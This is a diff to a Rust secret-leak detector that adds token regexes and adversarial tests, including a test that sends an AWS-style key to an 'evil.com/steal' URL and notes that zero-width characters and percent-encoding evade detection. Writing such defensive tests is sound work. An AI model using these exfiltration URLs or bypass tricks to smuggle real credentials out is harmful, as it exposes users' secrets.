@@ -273,10 +273,12 @@ impl LeakDetector {
             });
         }
 
-        // Log warnings
+        // Log warn-action matches at debug level (not warn!) to avoid
+        // corrupting REPL/TUI output. These are informational — real leaks
+        // use LeakAction::Redact which modifies the content silently.
         for m in &result.matches {
             if m.action == LeakAction::Warn {
-                tracing::warn!(
+                tracing::debug!(
                     pattern = %m.pattern_name,
                     severity = %m.severity,
                     preview = %m.masked_preview,
@@ -417,114 +419,143 @@ fn default_patterns() -> Vec<LeakPattern> {
         // OpenAI API keys
         LeakPattern {
             name: "openai_api_key".to_string(),
-            regex: Regex::new(r"sk-(?:proj-)?[a-zA-Z0-9]{20,}(?:T3BlbkFJ[a-zA-Z0-9_-]*)?").unwrap(),
+            regex: Regex::new(r"sk-(?:proj-)?[a-zA-Z0-9]{20,}(?:T3BlbkFJ[a-zA-Z0-9_-]*)?").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::Critical,
             action: LeakAction::Block,
         },
         // Anthropic API keys
         LeakPattern {
             name: "anthropic_api_key".to_string(),
-            regex: Regex::new(r"sk-ant-api[a-zA-Z0-9_-]{90,}").unwrap(),
+            regex: Regex::new(r"sk-ant-api[a-zA-Z0-9_-]{90,}").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::Critical,
             action: LeakAction::Block,
         },
         // AWS Access Key ID
         LeakPattern {
             name: "aws_access_key".to_string(),
-            regex: Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(),
+            regex: Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::Critical,
             action: LeakAction::Block,
         },
         // GitHub tokens
         LeakPattern {
             name: "github_token".to_string(),
-            regex: Regex::new(r"gh[pousr]_[A-Za-z0-9_]{36,}").unwrap(),
+            regex: Regex::new(r"gh[pousr]_[A-Za-z0-9_]{36,}").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::Critical,
             action: LeakAction::Block,
         },
         // GitHub fine-grained PAT
         LeakPattern {
             name: "github_fine_grained_pat".to_string(),
-            regex: Regex::new(r"github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59}").unwrap(),
+            regex: Regex::new(r"github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59}").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::Critical,
             action: LeakAction::Block,
         },
         // Stripe keys
         LeakPattern {
             name: "stripe_api_key".to_string(),
-            regex: Regex::new(r"sk_(?:live|test)_[a-zA-Z0-9]{24,}").unwrap(),
+            regex: Regex::new(r"sk_(?:live|test)_[a-zA-Z0-9]{24,}").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::Critical,
             action: LeakAction::Block,
         },
         // NEAR AI session tokens
         LeakPattern {
             name: "nearai_session".to_string(),
-            regex: Regex::new(r"sess_[a-zA-Z0-9]{32,}").unwrap(),
+            regex: Regex::new(r"sess_[a-zA-Z0-9]{32,}").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::Critical,
             action: LeakAction::Block,
         },
         // PEM private keys
         LeakPattern {
             name: "pem_private_key".to_string(),
-            regex: Regex::new(r"-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----").unwrap(),
+            regex: Regex::new(r"-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::Critical,
             action: LeakAction::Block,
         },
         // SSH private keys
         LeakPattern {
             name: "ssh_private_key".to_string(),
-            regex: Regex::new(r"-----BEGIN\s+(?:OPENSSH|EC|DSA)\s+PRIVATE\s+KEY-----").unwrap(),
+            regex: Regex::new(r"-----BEGIN\s+(?:OPENSSH|EC|DSA)\s+PRIVATE\s+KEY-----").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::Critical,
             action: LeakAction::Block,
         },
         // Google API keys
         LeakPattern {
             name: "google_api_key".to_string(),
-            regex: Regex::new(r"AIza[0-9A-Za-z_-]{35}").unwrap(),
+            regex: Regex::new(r"AIza[0-9A-Za-z_-]{35}").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::High,
             action: LeakAction::Block,
         },
         // Slack tokens
         LeakPattern {
             name: "slack_token".to_string(),
-            regex: Regex::new(r"xox[baprs]-[0-9a-zA-Z-]{10,}").unwrap(),
+            regex: Regex::new(r"xox[baprs]-[0-9a-zA-Z-]{10,}").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::High,
             action: LeakAction::Block,
         },
         // Twilio API keys
         LeakPattern {
             name: "twilio_api_key".to_string(),
-            regex: Regex::new(r"SK[a-fA-F0-9]{32}").unwrap(),
+            regex: Regex::new(r"SK[a-fA-F0-9]{32}").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::High,
             action: LeakAction::Block,
         },
         // SendGrid API keys
         LeakPattern {
             name: "sendgrid_api_key".to_string(),
-            regex: Regex::new(r"SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}").unwrap(),
+            regex: Regex::new(r"SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::High,
             action: LeakAction::Block,
         },
         // Bearer tokens (redact instead of block, might be intentional)
         LeakPattern {
             name: "bearer_token".to_string(),
-            regex: Regex::new(r"Bearer\s+[a-zA-Z0-9_-]{20,}").unwrap(),
+            regex: Regex::new(r"Bearer\s+[a-zA-Z0-9_-]{20,}").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::High,
             action: LeakAction::Redact,
         },
         // Authorization header with key
         LeakPattern {
             name: "auth_header".to_string(),
-            regex: Regex::new(r"(?i)authorization:\s*[a-zA-Z]+\s+[a-zA-Z0-9_-]{20,}").unwrap(),
+            regex: Regex::new(r"(?i)authorization:\s*[a-zA-Z]+\s+[a-zA-Z0-9_-]{20,}").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::High,
             action: LeakAction::Redact,
+        },
+        // OpenRouter API keys (sk-or-v1-<hex, 40+ chars>)
+        LeakPattern {
+            name: "openrouter_api_key".to_string(),
+            regex: Regex::new(r"\bsk-or-v1-[a-fA-F0-9]{40,}").unwrap(), // safety: hardcoded literal
+            severity: LeakSeverity::Critical,
+            action: LeakAction::Block,
+        },
+        // Anthropic OAuth tokens (sk-ant-oat<NN>-<base64url, 50+ chars>)
+        LeakPattern {
+            name: "anthropic_oauth_token".to_string(),
+            regex: Regex::new(r"\bsk-ant-oat\d{2}-[a-zA-Z0-9_-]{50,}").unwrap(), // safety: hardcoded literal
+            severity: LeakSeverity::Critical,
+            action: LeakAction::Block,
+        },
+        // Telegram bot tokens (<8-12 digit bot_id>:AA<base64url, 30+ chars>)
+        // Word boundary prevents false positives on timestamp-keyed log entries.
+        LeakPattern {
+            name: "telegram_bot_token".to_string(),
+            regex: Regex::new(r"\b\d{8,12}:AA[A-Za-z0-9_-]{30,}\b").unwrap(), // safety: hardcoded literal
+            severity: LeakSeverity::Critical,
+            action: LeakAction::Block,
+        },
+        // Groq API keys (gsk_<alphanumeric, 30+ chars>)
+        LeakPattern {
+            name: "groq_api_key".to_string(),
+            regex: Regex::new(r"\bgsk_[A-Za-z0-9]{30,}").unwrap(), // safety: hardcoded literal
+            severity: LeakSeverity::Critical,
+            action: LeakAction::Block,
         },
         // High entropy hex (potential secrets, warn only)
         // Uses word boundary since look-around isn't supported in the regex crate.
         // This catches standalone 64-char hex strings (like SHA256 hashes used as secrets).
         LeakPattern {
             name: "high_entropy_hex".to_string(),
-            regex: Regex::new(r"\b[a-fA-F0-9]{64}\b").unwrap(),
+            regex: Regex::new(r"\b[a-fA-F0-9]{64}\b").unwrap(), // safety: hardcoded literal
             severity: LeakSeverity::Medium,
             action: LeakAction::Warn,
         },
@@ -832,6 +863,637 @@ mod tests {
             let result = detector.scan(text);
             // Should not block (may warn on some patterns, but not block)
             assert!(!result.should_block, "clean text falsely blocked: {text}");
+        }
+    }
+
+    // ── OpenRouter, Anthropic OAuth, Telegram, Groq patterns ────────
+
+    #[test]
+    fn test_detect_openrouter_key() {
+        let detector = LeakDetector::new();
+        // Synthetic key — 64 hex chars after prefix
+        let content =
+            "LLM_API_KEY=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";
+        let result = detector.scan(content);
+        assert!(result.should_block, "OpenRouter key not detected");
+        assert!(
+            result
+                .matches
+                .iter()
+                .any(|m| m.pattern_name == "openrouter_api_key")
+        );
+    }
+
+    #[test]
+    fn test_detect_openrouter_key_in_json() {
+        let detector = LeakDetector::new();
+        let content =
+            r#"{"api_key": "sk-or-v1-aabbccdd00112233445566778899aabbccdd00112233445566"}"#;
+        let result = detector.scan(content);
+        assert!(result.should_block, "OpenRouter key in JSON not detected");
+    }
+
+    #[test]
+    fn test_openrouter_short_key_passes() {
+        let detector = LeakDetector::new();
+        let content = "sk-or-v1-abc123";
+        let result = detector.scan(content);
+        assert!(
+            !result.should_block,
+            "Short OpenRouter-like string falsely blocked"
+        );
+    }
+
+    #[test]
+    fn test_detect_anthropic_oauth() {
+        let detector = LeakDetector::new();
+        // Synthetic token — 90+ base64url chars after prefix
+        let content = "token=sk-ant-oat01-aaaBBBcccDDDeeeFFF111222333444555666777888999000aaaBBBcccDDDeeeFFF111222333444555666";
+        let result = detector.scan(content);
+        assert!(result.should_block, "Anthropic OAuth token not detected");
+        assert!(
+            result
+                .matches
+                .iter()
+                .any(|m| m.pattern_name == "anthropic_oauth_token")
+        );
+    }
+
+    #[test]
+    fn test_detect_telegram_bot_token() {
+        let detector = LeakDetector::new();
+        // Synthetic token — fake bot ID and token
+        let content = "TELEGRAM_BOT_TOKEN=12345678901:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw";
+        let result = detector.scan(content);
+        assert!(result.should_block, "Telegram bot token not detected");
+        assert!(
+            result
+                .matches
+                .iter()
+                .any(|m| m.pattern_name == "telegram_bot_token")
+        );
+    }
+
+    #[test]
+    fn test_telegram_short_id_passes() {
+        let detector = LeakDetector::new();
+        let content = "123:AAFoo";
+        let result = detector.scan(content);
+        assert!(
+            !result
+                .matches
+                .iter()
+                .any(|m| m.pattern_name == "telegram_bot_token"),
+            "Short bot ID falsely matched Telegram pattern"
+        );
+    }
+
+    #[test]
+    fn test_detect_groq_key() {
+        let detector = LeakDetector::new();
+        // Synthetic key — 56 alphanumeric chars after prefix
+        let content = "GROQ_API_KEY=gsk_aaaBBBcccDDDeeeFFF111222333444555666777888999000aaaBBBcc";
+        let result = detector.scan(content);
+        assert!(result.should_block, "Groq API key not detected");
+        assert!(
+            result
+                .matches
+                .iter()
+                .any(|m| m.pattern_name == "groq_api_key")
+        );
+    }
+
+    #[test]
+    fn test_groq_short_key_passes() {
+        let detector = LeakDetector::new();
+        let content = "gsk_abc";
+        let result = detector.scan(content);
+        assert!(
+            !result
+                .matches
+                .iter()
+                .any(|m| m.pattern_name == "groq_api_key"),
+            "Short Groq-like string falsely matched"
+        );
+    }
+
+    #[test]
+    fn test_scan_and_clean_blocks_openrouter() {
+        let detector = LeakDetector::new();
+        let content =
+            "key=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";
+        assert!(
+            detector.scan_and_clean(content).is_err(),
+            "scan_and_clean should block OpenRouter key"
+        );
+    }
+
+    #[test]
+    fn test_scan_and_clean_blocks_telegram() {
+        let detector = LeakDetector::new();
+        let content = "12345678901:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw";
+        assert!(
+            detector.scan_and_clean(content).is_err(),
+            "scan_and_clean should block Telegram token"
+        );
+    }
+
+    /// Adversarial tests for leak detector regex patterns and masking.
+    /// See <https://github.com/nearai/ironclaw/issues/1025>.
+    mod adversarial {
+        use crate::leak_detector::{LeakDetector, mask_secret};
+
+        // ── A. Regex backtracking / performance guards ───────────────
+
+        #[test]
+        fn openai_key_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "sk-" followed by almost enough chars but periodically
+            // broken by spaces to prevent full match.
+            let chunk = "sk-abcdefghij1234567 ";
+            let payload = chunk.repeat(5000);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "openai_key pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn high_entropy_hex_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: 63-char hex strings (1 short of the 64-char boundary)
+            let chunk = format!("{} ", "a".repeat(63));
+            let payload = chunk.repeat(1600);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "high_entropy_hex pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn bearer_token_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // "Bearer " followed by short strings (< 20 chars)
+            let chunk = "Bearer shorttoken123 ";
+            let payload = chunk.repeat(5000);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "bearer_token pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn authorization_header_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "authorization: " with short value (< 20 chars)
+            let chunk = "authorization: Bearer short12345 ";
+            let payload = chunk.repeat(3200);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "authorization pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn anthropic_key_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "sk-ant-api" followed by short string (< 90 chars)
+            let chunk = "sk-ant-api-shortkey12345 ";
+            let payload = chunk.repeat(4200);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "anthropic_api_key pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn aws_access_key_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "AKIA" followed by short string (< 16 chars)
+            let chunk = "AKIA12345678 ";
+            let payload = chunk.repeat(8500);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "aws_access_key pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn github_token_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "ghp_" followed by short string (< 36 chars)
+            let chunk = "ghp_shorttoken12345 ";
+            let payload = chunk.repeat(5200);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "github_token pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn github_fine_grained_pat_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "github_pat_" followed by short string (< 22 chars)
+            let chunk = "github_pat_shortval12 ";
+            let payload = chunk.repeat(4800);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "github_fine_grained_pat pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn stripe_key_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "sk_live_" followed by short string (< 24 chars)
+            let chunk = "sk_live_short12345 ";
+            let payload = chunk.repeat(5500);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "stripe_api_key pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn nearai_session_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "sess_" followed by short string (< 32 chars)
+            let chunk = "sess_shorttoken12 ";
+            let payload = chunk.repeat(5800);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "nearai_session pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn pem_private_key_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "-----BEGIN " without "PRIVATE KEY-----"
+            let chunk = "-----BEGIN RSA PUBLIC KEY-----\n";
+            let payload = chunk.repeat(3500);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "pem_private_key pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn ssh_private_key_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "-----BEGIN OPENSSH " without "PRIVATE KEY-----"
+            let chunk = "-----BEGIN OPENSSH PUBLIC KEY-----\n";
+            let payload = chunk.repeat(3000);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "ssh_private_key pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn google_api_key_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "AIza" followed by short string (< 35 chars)
+            let chunk = "AIza_short12345 ";
+            let payload = chunk.repeat(6700);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "google_api_key pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn slack_token_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "xoxb-" followed by short string (< 10 chars)
+            let chunk = "xoxb-short ";
+            let payload = chunk.repeat(9500);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "slack_token pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn twilio_api_key_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "SK" followed by short hex (< 32 chars)
+            let chunk = "SKabcdef1234567 ";
+            let payload = chunk.repeat(6700);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "twilio_api_key pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn sendgrid_api_key_pattern_100kb_near_miss() {
+            let detector = LeakDetector::new();
+            // Near-miss: "SG." followed by short string (< 22 chars)
+            let chunk = "SG.short12345 ";
+            let payload = chunk.repeat(7500);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let _result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "sendgrid_api_key pattern took {}ms on 100KB near-miss",
+                elapsed.as_millis()
+            );
+        }
+
+        #[test]
+        fn all_patterns_100kb_clean_text() {
+            let detector = LeakDetector::new();
+            let payload = "The quick brown fox jumps over the lazy dog. ".repeat(2500);
+            assert!(payload.len() > 100_000);
+
+            let start = std::time::Instant::now();
+            let result = detector.scan(&payload);
+            let elapsed = start.elapsed();
+            assert!(
+                elapsed.as_millis() < 100,
+                "full scan took {}ms on 100KB clean text",
+                elapsed.as_millis()
+            );
+            assert!(result.is_clean());
+        }
+
+        // ── B. Unicode edge cases ────────────────────────────────────
+
+        #[test]
+        fn zwsp_inside_api_key_does_not_match() {
+            let detector = LeakDetector::new();
+            // ZWSP (\u{200B}) inserted into an OpenAI-style key
+            let key = format!("sk-proj-{}\u{200B}{}", "a".repeat(10), "b".repeat(15));
+            let result = detector.scan(&key);
+            // ZWSP breaks the [a-zA-Z0-9] char class match — should NOT detect.
+            // This documents a known limitation.
+            assert!(
+                result.is_clean() || !result.should_block,
+                "ZWSP-split key should not fully match openai pattern"
+            );
+        }
+
+        #[test]
+        fn rtl_override_prefix_on_aws_key() {
+            let detector = LeakDetector::new();
+            let content = "\u{202E}AKIAIOSFODNN7EXAMPLE";
+            let result = detector.scan(content);
+            // RTL override is \u{202E} (3 bytes), prepended before "AKIA".
+            // The regex has no word boundary anchor on the left for AWS keys,
+            // so the AKIA prefix is still matched after the RTL char.
+            assert!(
+                !result.is_clean(),
+                "RTL override prefix should not prevent AWS key detection"
+            );
+        }
+
+        #[test]
+        fn zwj_inside_stripe_key() {
+            let detector = LeakDetector::new();
+            // ZWJ (\u{200D}) inserted into a Stripe-style key
+            let content = format!("sk_live_{}\u{200D}{}", "a".repeat(12), "b".repeat(12));
+            let result = detector.scan(&content);
+            // ZWJ breaks the [a-zA-Z0-9] char class — should not fully match.
+            assert!(
+                result.is_clean() || !result.should_block,
+                "ZWJ-split Stripe key should not be detected — known bypass"
+            );
+        }
+
+        #[test]
+        fn zwnj_inside_github_token() {
+            let detector = LeakDetector::new();
+            // ZWNJ (\u{200C}) inserted into a GitHub token
+            let content = format!("ghp_{}\u{200C}{}", "x".repeat(18), "y".repeat(18));
+            let result = detector.scan(&content);
+            // ZWNJ breaks the [A-Za-z0-9_] char class — should not fully match.
+            assert!(
+                result.is_clean() || !result.should_block,
+                "ZWNJ-split GitHub token should not be detected — known bypass"
+            );
+        }
+
+        #[test]
+        fn emoji_adjacent_to_secret() {
+            let detector = LeakDetector::new();
+            let content = "🔑AKIAIOSFODNN7EXAMPLE🔑";
+            let result = detector.scan(content);
+            assert!(
+                !result.is_clean(),
+                "emoji adjacent to AWS key should still detect"
+            );
+        }
+
+        #[test]
+        fn multibyte_chars_surrounding_pem_key() {
+            let detector = LeakDetector::new();
+            let content = "中文内容\n-----BEGIN RSA PRIVATE KEY-----\ndata\n中文结尾";
+            let result = detector.scan(content);
+            assert!(
+                !result.is_clean(),
+                "PEM key surrounded by multibyte chars should be detected"
+            );
+        }
+
+        #[test]
+        fn mask_secret_with_multibyte_chars() {
+            // mask_secret uses .len() for byte length but .chars() for
+            // prefix/suffix. Test with multibyte content to ensure no panic.
+            let secret = "sk-tëst1234567890àbçdéfghîj";
+            let masked = mask_secret(secret);
+            // Should not panic, and should produce some output
+            assert!(!masked.is_empty());
+        }
+
+        #[test]
+        fn mask_secret_with_emoji() {
+            // 4-byte UTF-8 emoji chars
+            let secret = "🔑🔐🔒🔓secret_key_value_here🔑🔐🔒🔓";
+            let masked = mask_secret(secret);
+            assert!(!masked.is_empty());
+        }
+
+        // ── C. Control character variants ────────────────────────────
+
+        #[test]
+        fn control_chars_around_github_token() {
+            let detector = LeakDetector::new();
+            for byte in [0x01u8, 0x02, 0x0B, 0x0C, 0x1F] {
+                let content = format!(
+                    "{}ghp_{}{}",
+                    char::from(byte),
+                    "x".repeat(36),
+                    char::from(byte)
+                );
+                let result = detector.scan(&content);
+                assert!(
+                    !result.is_clean(),
+                    "control char 0x{:02X} around GitHub token should not prevent detection",
+                    byte
+                );
+            }
+        }
+
+        #[test]
+        fn bom_prefix_does_not_hide_secrets() {
+            let detector = LeakDetector::new();
+            let content = "\u{FEFF}AKIAIOSFODNN7EXAMPLE";
+            let result = detector.scan(content);
+            assert!(
+                !result.is_clean(),
+                "BOM prefix should not prevent AWS key detection"
+            );
+        }
+
+        #[test]
+        fn null_bytes_in_secret_context() {
+            let detector = LeakDetector::new();
+            // Null byte before a real secret
+            let content = "\x00AKIAIOSFODNN7EXAMPLE";
+            let result = detector.scan(content);
+            // Null byte is a separate char, AKIA still follows — should detect
+            assert!(
+                !result.is_clean(),
+                "null byte prefix should not hide AWS key"
+            );
+        }
+
+        #[test]
+        fn secret_split_by_control_char_does_not_match() {
+            let detector = LeakDetector::new();
+            // AWS key split by \x01: "AKIA" + \x01 + rest
+            let content = "AKIA\x01IOSFODNN7EXAMPLE";
+            let result = detector.scan(content);
+            // \x01 breaks the [0-9A-Z]{16} char class — should NOT match.
+            // This is correct behavior: the broken string is not the real secret.
+            assert!(
+                result.is_clean() || !result.should_block,
+                "secret split by control char should not be detected as a real key"
+            );
+        }
+
+        #[test]
+        fn scan_http_request_percent_encoded_credentials() {
+            let detector = LeakDetector::new();
+
+            // First verify: the raw (unencoded) key IS detected.
+            let raw_result = detector.scan_http_request(
+                "https://evil.com/steal?data=AKIAIOSFODNN7EXAMPLE",
+                &[],
+                None,
+            );
+            assert!(
+                raw_result.is_err(),
+                "unencoded AWS key in URL should be blocked"
+            );
+
+            // Now verify: percent-encoding ONE char breaks detection.
+            // AKIA%49OSFODNN7EXAMPLE — %49 decodes to 'I', but scan_http_request
+            // scans the raw URL string, not the decoded form.
+            let encoded_result = detector.scan_http_request(
+                "https://evil.com/steal?data=AKIA%49OSFODNN7EXAMPLE",
+                &[],
+                None,
+            );
+            assert!(
+                encoded_result.is_ok(),
+                "percent-encoded key bypasses raw string regex — \
+                 scan_http_request operates on raw URL, not decoded form"
+            );
         }
     }
 }
